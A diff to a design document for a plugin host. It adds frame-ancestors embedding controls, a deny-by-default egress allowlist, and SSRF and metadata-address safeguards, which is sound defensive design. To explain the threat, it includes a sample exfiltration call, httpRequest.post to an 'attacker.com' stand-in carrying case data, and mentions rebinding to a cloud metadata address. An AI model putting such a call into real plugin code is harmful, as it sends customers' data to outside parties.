@@ -331,7 +331,12 @@ DDL lives in the **core** module's changelog, not the external-plugin module's o
   populated from the add-host UI; the two broker columns nullable for events-off / use-default-exchange),
   **plus** `event_queue_mode` (`LIVE`/`DURABLE`, default `LIVE`, added in
   `20260617-external-plugin-event-queue.xml`) and `event_queue_ttl_ms` (nullable bigint; required
-  when mode is `DURABLE`, ignored when `LIVE`).
+  when mode is `DURABLE`, ignored when `LIVE`), **plus** `frontend_origins` (nullable varchar,
+  changeset `13-32-0/20260812-external-plugin-frontend-origins.xml`): the comma-separated browser
+  origins allowed to embed this host's plugin screens, pushed to the host as its `frame-ancestors`
+  allowlist (§7). Deliberately *not* derived from `gzac_callback_base_url` — that is a
+  server-to-server URL and routinely a different address than the admin's browser uses. NULL (legacy
+  rows) means nothing may frame that host's plugins until an admin fills it in.
 - `external_plugin_definition` — `UNIQUE(plugin_id, version)`, `config_schema`, `manifest_json`,
   `host_id`, `base_url`, `status`, plus `name`, `description`, `provider`, `min_gzac_version` /
   `max_gzac_version` (populated at discovery from the manifest's `compatibility` block, compared
@@ -396,7 +401,8 @@ returns pre-fills the add-host UI uses to populate the new-host form:
   "eventBrokerExchange": "valtimo-events",
   "defaultEventQueueTtlMs": 259200000,
   "minEventQueueTtlMs": 3600000,
-  "maxEventQueueTtlMs": 2592000000
+  "maxEventQueueTtlMs": 2592000000,
+  "frontendOrigins": ["https://valtimo.example.com"]
 }
 ```
 
@@ -418,17 +424,39 @@ a confidential transport (HTTPS, or a loopback address for local development) an
 registration otherwise, so the broker AMQP URL and credentials are never pushed over plaintext
 (§3.9).
 
-The same service exposes a **narrowly-scoped update path** for the event-queue mode/TTL only:
-`PATCH /api/management/v1/external-plugin/host/{hostId}/event-queue` with
-`{eventQueueMode, eventQueueTtlMs}`. `baseUrl`, `secret`, `eventBrokerAmqpUrl`, and
-`eventBrokerExchange` remain immutable — the security check that pins broker credentials to a
-confidential `baseUrl` only needs to run at registration. After the PATCH, the resource triggers
-`discoveryService.discoverAll()` so the host's `EventConsumerManager.sync()` swaps the queue
-immediately instead of waiting for the next polling tick.
+Registration rejections use `ExternalPluginHostValidationException`, which
+`ExternalPluginHostValidationExceptionMapper` renders as a **400** whose `detail` is the operator-
+facing reason. That matters for the add-host UI: the modal keeps everything the admin typed and
+shows the reason inline (`InterceptorSkip: 400` keeps it off the generic error toast), rather than
+the catch-all 500-with-a-reference-id it produced before. Two rejections use it today — a broker on a
+non-confidential base URL, and a base URL that is a *bind* address (`0.0.0.0`, `::`) rather than an
+address GZAC can dial.
+
+The same service exposes **narrowly-scoped update paths** for the two runtime-editable fields.
+`baseUrl`, `secret`, `eventBrokerAmqpUrl`, and `eventBrokerExchange` remain immutable — the security
+check that pins broker credentials to a confidential `baseUrl` only needs to run at registration.
+
+- `PATCH /api/management/v1/external-plugin/host/{hostId}/event-queue` with
+  `{eventQueueMode, eventQueueTtlMs}`. After the PATCH, the resource triggers
+  `discoveryService.discoverAll()` so the host's `EventConsumerManager.sync()` swaps the queue
+  immediately instead of waiting for the next polling tick.
+- `PATCH /api/management/v1/external-plugin/host/{hostId}/frontend-origins` with
+  `{frontendOrigins}` — the browser origins allowed to embed this host's plugin screens (§7).
+  Each entry is validated and canonicalised to a bare `scheme://host[:port]`; wildcards, paths,
+  credentials and non-http(s) schemes are rejected, since a wildcard would defeat the allowlist.
+  The new list is pushed to the host immediately, and re-pushed on every discovery poll anyway.
+
+The add-host form pre-fills `frontendOrigins` from `valtimo.web.cors.corsConfiguration.allowedOrigins`
+(the browser origins the API already trusts — in a split frontend/backend deployment exactly the
+Angular origin set), with wildcard entries dropped. When CORS declares none, the modal falls back to
+the admin's own `window.location.origin`: unlike `gzacCallbackBaseUrl`, that *is* the page the plugin
+will be embedded in.
 
 ## 7. Plugin host 🟡 (`plugin-host/app/`, Node + Fastify + Extism)
 
-Routes: `GET /health`; `*/api/host/plugins[...]` (HMAC-signed §3.9; POST upload, GET list —
+Routes: `GET /health`; `PUT /api/host/gzac-instances` (HMAC-signed §3.9; a GZAC instance announces
+`{gzacBaseUrl, frontendOrigins}` — see the plugin-content CSP below); `*/api/host/plugins[...]`
+(HMAC-signed §3.9; POST upload, GET list —
 each listing entry carries the package `contentHash` GZAC pins at discovery, §11 — and DELETE);
 `POST|PUT|DELETE|GET /api/host/configurations/:configId` (HMAC-signed §3.9; push body
 carries `pluginId, pluginVersion, properties, serviceToken, gzacBaseUrl, eventSubscriptions,
@@ -439,7 +467,10 @@ not match the loaded package's hash is refused with 409 (§11) so a config and i
 token can never reach package bytes other than the pinned ones); `POST
 /plugins/:id/:version/actions/:key`
 (HMAC-signed §3.9 — **no GET variant**); public `GET …/plugin-manifest`, `…/logo`,
-`…/bundles/**` (bundles and logo are served with the strict plugin-content CSP — see below), and
+`…/bundles/**` (bundles and logo are served with the strict plugin-content CSP — see below),
+`GET …/frame-policy?origin=` (a public **probe**, answering `{allowed}` for the one origin the
+caller names — deliberately not a listing, so it never enumerates which GZAC frontends use this
+host), and
 `POST …/data` (the `handle_request` RPC route, §13.4/§13.5 — browser-facing
 with CORS `*` + `OPTIONS` preflight, so it carries no HMAC, but executing Wasm is gated on a
 chain of checks: the request must name a `configurationId` whose pushed configuration exists,
@@ -532,19 +563,40 @@ funnel through one generic `callExport`; the public `callAction`/`callEvent`/`ca
   assets live under the bundle path. The CSP `sandbox` directive mirrors the embedding iframe's
   attribute, so a bundle opened directly in a top-level tab is confined to an opaque origin too,
   instead of running same-origin with the host.
+- **`frame-ancestors`** is the one directive computed per request, and it closes a different hole:
+  *who may embed the plugin*. The iframe holds no credential, but an attacker-controlled page that
+  can frame a bundle answers the plugin's proxied calls itself and renders a convincing off-origin
+  fake. The allowlist is the union of the origins every GZAC instance has announced
+  (`PUT /api/host/gzac-instances`, persisted in `gzac_instances`, ignored once older than
+  `FRAME_ANCESTOR_STALE_MS` — there is no deregistration call, so ageing out is what removes a
+  decommissioned GZAC) and the `ALLOWED_FRAME_ANCESTORS` env escape hatch. GZAC re-announces on
+  every discovery poll, which makes the allowlist self-healing: a newly connected GZAC becomes
+  framable within one cycle with neither side restarted. **Fail closed** — with no origins at all
+  the host serves `frame-ancestors 'none'` plus `X-Frame-Options: DENY` (the older header has no
+  allowlist form, so it is only sent in that all-deny case) and logs once naming both ways to
+  populate the list. Lookups go through a short-TTL cached registry (`frame-ancestor-registry.ts`,
+  reusing `CONFIG_CACHE_TTL_MS`) because this sits on the bundle hot path. The frontend SDK
+  additionally probes `…/frame-policy` before trusting an `init` from an unknown parent origin —
+  defence in depth for proxies that strip CSP; an explicit `allowed: false` refuses init, while an
+  unanswerable probe only warns.
 
 Environment (`models/app-config.ts`): `ADMIN_TOKEN` (required — the shared secret used as the
 HMAC key for every GZAC→host route, §3.9), `PORT` (8090),
 `PLUGIN_STORAGE_DIR` (`./plugins`), `LOG_LEVEL` (info), `HOST_ID` (defaults to the OS hostname;
 see §8.4), the execution/abuse bounds `WASM_TIMEOUT_MS` (30 s), `WASM_MAX_MEMORY_PAGES` (4096),
 `WASM_INSTANCE_IDLE_TTL_MS` (10 min), `GZAC_API_TIMEOUT_MS` (60 s), `UPLOAD_MAX_BYTES` (25 MB),
-`DATA_RATE_LIMIT_PER_MINUTE` (120) and `CONFIG_CACHE_TTL_MS` (10 s), plus `DB_HOST` / `DB_PORT`
+`DATA_RATE_LIMIT_PER_MINUTE` (120) and `CONFIG_CACHE_TTL_MS` (10 s), the embedding controls
+`ALLOWED_FRAME_ANCESTORS` (unset — extra browser origins allowed to frame plugin content, on top of
+those GZAC announces) and `FRAME_ANCESTOR_STALE_MS` (7 days — how long a GZAC instance stays in the
+allowlist without re-announcing), plus `DB_HOST` / `DB_PORT`
 (defaults to **5434**, not the standard 5432) / `DB_NAME` / `DB_USER` / `DB_PASSWORD` for the
 host's PostgreSQL, and optional `TLS_CERT_PATH` / `TLS_KEY_PATH` (set together to serve HTTPS —
 §3.9) plus `TLS_CA_PATH` for a certificate chain. `HOST_ALLOW_HTTP` / `HOST_ALLOW_PRIVATE_NETWORK`
-relax the `http_request` target policy for local development (§18.6), and `LOG_RETENTION_DAYS`
-(30) drives the log-retention job (§18.9). **No broker variables** — the host never configures a
-broker itself.
+relax the `http_request` target policy for local development (§18.6),
+`HOST_ALLOWED_INTERNAL_CIDRS` (unset — comma-separated CIDRs this host may reach despite being
+private, the production alternative to `HOST_ALLOW_PRIVATE_NETWORK`, §18.6), and
+`LOG_RETENTION_DAYS` (30) drives the log-retention job (§18.9). **No broker variables** — the host
+never configures a broker itself.
 
 Gaps to close for production: no HTMX `render_page`.
 Host capabilities (`gzac_api`, `http_request`, `kv`, `log`, `frontend_data`) and their persistent
@@ -1861,12 +1913,66 @@ interface HttpRequestOutput {
 ```
 
 **Security constraints:**
+- **Deny by default** — a destination is refused unless it is in the configuration's egress
+  allowlist (`security/egress-allowlist.ts`). This brings the Wasm half of a plugin in line with the
+  `connect-src 'self'` its iframe half already runs under (§7): without it, an author who cannot
+  beacon out from the browser could `httpRequest.post("https://attacker.com", caseData)` from the
+  backend for the same effect. The realistic threat is not a deliberately hostile author but a
+  **compromised npm dependency inside a plugin the customer legitimately trusts** — injected code
+  phones home to a domain the manifest never declared, which is exactly what a declared-egress
+  allowlist catches. Because the check runs **before any name resolution**, it also closes
+  DNS-encoded exfiltration: an undeclared hostname is never even looked up. What it does *not*
+  close is the author's own declared domain — for a plugin integrating with a vendor's SaaS that
+  endpoint is simultaneously the legitimate destination and a perfect exfil channel. No technical
+  control fixes that; it is a trust decision the customer makes when installing the plugin, and it
+  degrades gracefully: the destination is named on the acceptance screen, it is a party the customer
+  has a commercial relationship with, and with a small fixed destination set the `plugin_logs`
+  record below becomes **auditable** — an unexpected host in it is a finding.
+- **Two declaration sources, unioned** — GZAC merges them and pushes one `allowedEgress` array, so
+  the host never learns which source an entry came from:
+  - `manifest.permissions.egress` — fixed origins the plugin author knows at build time
+    (`api.kvk.nl`). A real grant: stored in `external_plugin_granted_egress`, all-or-nothing
+    against the manifest, shown on the acceptance screen, and **immutable after activation** (like
+    events and capabilities — resettable only via the admin-confirmed version overwrite, §11). A
+    plugin silently gaining a destination on a configuration edit is precisely what this prevents.
+  - `x-egress-target` configuration properties — environment-specific origins only the admin knows
+    (`https://smartdocuments.acme-acc.internal:8443`). No grant table and no acceptance gate of its
+    own, because the admin *typing the value* is the grant. Derived inside `pushToHost` from the
+    already-decrypted properties, which is what keeps the allowlist tracking values that
+    legitimately change on edit. See §18.6.1.
+- **Matched on origin, not hostname** — scheme + host + port. A scheme-less manifest entry
+  (`api.kvk.nl`) means https on 443; hostname-only matching would let an `http://` downgrade through
+  the moment someone sets `HOST_ALLOW_HTTP=true`. A missing port means *the default port*, never
+  "any port", or `sd.internal` would silently authorise `sd.internal:9200`. Wildcards are
+  manifest-only, `*.` prefix only, at least two labels after it (so `*.com` is impossible), match
+  exactly one label, and are rendered distinctly on the acceptance screen — `*.vendor.com` under
+  author-controlled DNS reopens both arbitrary-subdomain exfiltration and the DNS channel.
 - **HTTPS-only by default** — plain-http targets require `HOST_ALLOW_HTTP=true` (local dev).
 - **SSRF guard**: connections to private/reserved addresses are blocked at the socket's own DNS
   lookup (a guarded undici `Agent`, `security/url-guard.ts`), so the address check is pinned to
   the exact addresses being connected to — no DNS-rebinding window — and automatically covers
-  every redirect hop; IP-literal hosts (which skip DNS) are rejected up front. Disabled with
-  `HOST_ALLOW_PRIVATE_NETWORK=true` (local dev).
+  every redirect hop; IP-literal hosts (which skip DNS) are rejected up front. This is a **safety
+  floor beneath the allowlist, not a permission mechanism**: the two layers are complementary, not
+  alternatives. An origin allowlist alone re-opens DNS rebinding (a declared `sd.internal` that
+  resolves to 169.254.169.254), and the address envelope alone is host-global and says nothing about
+  which plugin is calling. Neither is sound on its own.
+- **Operator carve-out, never a bypass** — `HOST_ALLOWED_INTERNAL_CIDRS` (e.g.
+  `10.4.7.12/32,10.4.7.0/24`) declares ranges this host may reach despite being private. Applied
+  *inside* `isPrivateOrReservedAddress`, so both enforcement points (the IP-literal check and the
+  guarded agent's `lookup`) inherit it and the rebinding-proof property survives. **169.254.0.0/16
+  is a hard floor** and is never allowlistable — including its IPv4-mapped forms — because cloud
+  metadata services hand instance credentials to anything that can reach them and no plugin has a
+  legitimate reason to call one; an overlapping entry is refused at startup with a loud error, and
+  the floor is re-checked at runtime. Malformed entries are dropped with a warning, which fails
+  closed. `HOST_ALLOW_PRIVATE_NETWORK=true` remains the **dev-only** switch — it replaces the
+  guarded dispatcher with a bare one, disabling the classifier wholesale, and now logs a loud
+  warning at startup when it is on.
+  > **Keep these ranges narrow, and prefer a NetworkPolicy.** In Kubernetes the right place for
+  > egress policy is a NetworkPolicy or an egress proxy, not an app-level CIDR list. If the answer
+  > to "which CIDR do we allowlist?" is the pod CIDR (`10.42.0.0/16` or similar), the allowlist has
+  > become a no-op: that reaches every pod in the cluster, including GZAC directly by IP — which
+  > also sidesteps the `gzacBaseUrl` origin check, since that compares origin strings and a pod IP
+  > or alternate Service DNS name will not match. Use a specific ClusterIP or a /32.
 - The `url` must not resolve to the configuration's `gzacBaseUrl` origin — use `gzac_api` for
   that.
 - **Redirects are followed manually** (max 5) so every hop re-runs the full target validation —
@@ -1880,7 +1986,8 @@ interface HttpRequestOutput {
 `source: "http_request"`) with method, **redacted URL** (userinfo and query string stripped —
 `user:pass@` and `?token=…` routinely carry secrets, so only scheme+host+path are recorded),
 status, duration, and the calling configuration/plugin id. This gives the admin visibility into
-what external calls plugins make.
+what external calls plugins make — and with a declared destination set it is *auditable* rather than
+merely voluminous: a host in the log that is not on the allowlist is a finding, not noise.
 
 **SDK** (`plugin-sdk/src/http-request.ts`):
 
@@ -1895,6 +2002,81 @@ export const httpRequest = {
 
 Mirrors the `gzacApi` shape. Calls the `http_request` Extism host function under the hood, same
 `Host.getFunctions()` mechanism.
+
+#### 18.6.1 Declaring egress targets
+
+Both declaration sources live in `manifest.json`, and which one a target belongs in follows from who
+knows its value. A target that is the same in every environment is **plugin-intrinsic** — the author
+knows it at build time, so it belongs in `permissions.egress`. A target that differs per customer or
+per environment is **deployment-intrinsic**: a manifest declaration would be forced into one of two
+useless shapes, a wildcard broad enough to be meaningless or a per-environment rebuild of the
+package. Those are already a configuration property the admin fills in, so that is where the grant
+is drawn from — marked with `x-egress-target`, which follows the `x-secret` precedent (§18.4): a
+JSON-Schema keyword the author puts on a property that GZAC walks server-side to decide behaviour.
+
+```json
+{
+  "permissions": {
+    "capabilities": ["http_request"],
+    "egress": ["api.kvk.nl"]
+  },
+  "configurationSchema": {
+    "properties": {
+      "smartDocumentsUrl": { "type": "string", "format": "uri", "x-egress-target": true },
+      "apiKey": { "type": "string", "x-secret": true }
+    }
+  }
+}
+```
+
+Three parties, each declaring only what they actually know:
+
+| Party | Declares | Where |
+|---|---|---|
+| Plugin author | *"I call these fixed services, plus one configurable one"* | `permissions.egress` + `x-egress-target` |
+| Admin | *"in this environment the configurable one is `https://sd.acme-acc.internal:8443`"* | the configuration value, as today |
+| Operator | *"this host may reach `10.4.7.0/24` at all"* | `HOST_ALLOWED_INTERNAL_CIDRS` env |
+
+The effective policy is the **union of both declaration sources**, intersected with the CIDR envelope
+for anything resolving into private space, with 169.254/16 excluded unconditionally:
+
+```
+allowed = inDeclaredOrigins(url)
+          && (blocked(resolvedAddr) ? inOperatorCidrs(resolvedAddr) : true)
+          && !isMetadataAddress(resolvedAddr)          // hard floor, never overridable
+```
+
+Validation rules, enforced at every layer that can catch them early:
+
+- **Pack tool and upload route** (`plugin-sdk/manifest-validation.ts`, shared so the rules are
+  defined once): every `permissions.egress` entry must normalise to an http(s) origin — no
+  credentials, no path, no bare or whole-TLD wildcard — and declaring `egress` requires
+  `http_request` in `capabilities`, the same shape as the existing endpoints→`gzac_api` rule. A
+  property marked `x-egress-target` must be a string with `"format": "uri"`, since GZAC has to parse
+  its value into an origin and a property that never holds a URL would look like a grant while
+  contributing nothing.
+- **Activation/edit** (`ExternalPluginConfigurationService`): granted egress must match the manifest
+  exactly, and a marked property whose value is not a parseable absolute http(s) URL **rejects the
+  configuration** with a message naming the field. Fail closed: silently contributing nothing would
+  leave the admin believing they had granted a destination the host will refuse.
+- **Discovery** (`ExternalPluginDiscoveryService`): a new plugin version that drops the
+  `x-egress-target` flag from a property logs a loud warning, mirroring `warnOnDroppedSecretFlags` —
+  the destination silently disappears from the allowlist otherwise, and the plugin's calls start
+  failing.
+
+Normalisation is mirrored in three places — the SDK module `@valtimo/plugin-sdk/egress` (shared by the
+manifest validator and the host's runtime check), `PluginEgressTargets` in GZAC, and the frontend's
+display-only preview — so a target that passes review is exactly the target permitted at runtime.
+
+If a URL property is also marked `x-secret` (credentials in userinfo), derivation still works because
+GZAC holds the plaintext server-side at push time; the origin is redacted in the UI and logs, and an
+entry carrying credentials is rejected rather than normalised.
+
+**Migration.** This is a breaking change to the grant model: existing configurations get an empty
+allowlist and therefore make no outbound calls until GZAC pushes one. In-tree the blast radius is a
+single manifest line for the `case-summary` sample (which hardcodes
+`https://jsonplaceholder.typicode.com/todos/1`); internal POC plugins need auditing for undeclared
+destinations. The window for landing this cheaply closes at V1.
 
 ### 18.7 Capability: `kv` ✅
 
@@ -2389,8 +2571,10 @@ plugin has one pre-existing TS error in the submit handler unrelated to capabili
 - `host-functions/log.ts` (new) — `log` host function with capability gate, writes to pino +
   persists to `plugin_logs` (async, non-blocking).
 - `host-functions/http-request.ts` (new) — `http_request` host function with capability gate,
-  HTTPS-only default (`HOST_ALLOW_HTTP=true` for dev), blocks calls to `gzacBaseUrl`, timeout
-  cap 60s, auto-logs to `plugin_logs`.
+  deny-by-default egress allowlist (`security/egress-allowlist.ts`), HTTPS-only default
+  (`HOST_ALLOW_HTTP=true` for dev), SSRF address envelope with the `HOST_ALLOWED_INTERNAL_CIDRS`
+  operator carve-out (`security/url-guard.ts`), blocks calls to `gzacBaseUrl`, timeout cap 60s,
+  auto-logs to `plugin_logs`. Every check re-runs on each redirect hop.
 - `plugin-manager.ts` — registers all 4 host functions on `createPlugin`, new constructor
   params (`configRepository`, `kvRepository`, `logRepository`, `allowHttp`), private
   `resolveCapabilities()` helper, threads `grantedCapabilities` through every `hostContext`.
